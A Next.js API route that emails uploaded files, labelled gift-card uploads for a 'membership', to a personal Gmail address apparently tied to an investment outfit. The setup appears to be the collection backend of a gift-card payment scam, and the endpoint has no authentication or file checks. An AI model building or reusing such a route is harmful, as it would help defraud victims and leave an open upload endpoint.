import { NextResponse } from "next/server";
import { Resend } from "resend";
import { RESEND_API_KEY } from "@/config/env";

const resend = new Resend(RESEND_API_KEY);

export async function POST(req: Request) {
  try {
    const formData = await req.formData();
    const file = formData.get("file") as File;

    if (!file) {
      return NextResponse.json({ success: false, error: "No file uploaded" });
    }

    const buffer = Buffer.from(await file.arrayBuffer());

    await resend.emails.send({
      from: "Membership <onboarding@resend.dev>",
      to: "apexcapitalinvestments432@gmail.com",
      subject: `New Giftcard Upload - ${file.name}`,
      html: "<p>A user uploaded a new giftcard.</p>",
      attachments: [
        {
          filename: file.name,
          content: buffer,
        },
      ],
    });

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ success: false, error: "Email failed" });
  }
}
